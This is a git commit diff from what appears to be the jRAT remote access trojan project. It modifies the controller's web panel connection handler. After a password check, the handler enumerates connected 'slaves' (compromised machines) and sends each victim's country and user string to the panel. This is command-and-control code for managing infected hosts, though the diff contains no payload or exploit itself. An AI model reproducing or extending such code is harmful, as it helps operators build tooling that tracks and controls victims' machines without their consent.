3f5fb171bbd1f6830ef94a3e3b9b21cabce0b592
redpois0n <red@cmail.nu>
2015-01-25 18:32:21 +0100

    Sends country and user string, works

--- Controller/src/se/jrat/client/webpanel/WebPanelConnection.java
+++ Controller/src/se/jrat/client/webpanel/WebPanelConnection.java
@@ -1,12 +1,15 @@
 package se.jrat.client.webpanel;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
-import java.io.PrintWriter;
 import java.net.Socket;
+
+import se.jrat.client.AbstractSlave;
+import se.jrat.client.Main;
 
 public class WebPanelConnection implements Runnable {
 
@@ -15,44 +18,51 @@ public class WebPanelConnection implements Runnable {
 	private DataInputStream dis;
 	private DataOutputStream dos;
 	private BufferedReader br;
-	private PrintWriter pw;
-	
+	private BufferedWriter bw;
+
 	public WebPanelConnection(WebPanelListener parent, Socket socket) throws Exception {
 		this.parent = parent;
 		this.socket = socket;
 		this.dis = new DataInputStream(socket.getInputStream());
 		this.dos = new DataOutputStream(socket.getOutputStream());
 		this.br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-		this.pw = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()));
+		this.bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
 	}
 
 	@Override
 	public void run() {
 		try {
-			assert dis.readByte() == WebPanelPackets.PACKET_AUTH;
 			String pass = readLine();
-			
-			if (!pass.equals(parent.getHashedPassword())) {
-				throw new Exception("Failed to auth, got password " + pass);
-			}
 
-			byte packet = dis.readByte();
+            if (!pass.equals(parent.getHashedPassword())) {
+                throw new Exception("Failed to auth, got password " + pass);
+            }
 
-			if (packet == WebPanelPackets.PACKET_LIST) {
+            int packet = readNumber();
 
-			}
-						
+            if (packet == WebPanelPackets.PACKET_LIST) {
+            	StringBuilder sb = new StringBuilder();
+            	
+            	for (AbstractSlave slave : Main.connections) {
+            		sb.append(slave.getCountry() + ":" + slave.formatUserString());
+            		sb.append(";");
+            	}
+            	
+            	bw.write(sb.toString() + "\n");
+            	bw.flush();
+            }
+
 			socket.close();
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
-	
+
 	public String readLine() throws Exception {
 		return br.readLine().trim();
 	}
-	
-	public int readInt() throws Exception {
+
+	public int readNumber() throws Exception {
 		return Integer.parseInt(readLine());
 	}
 }
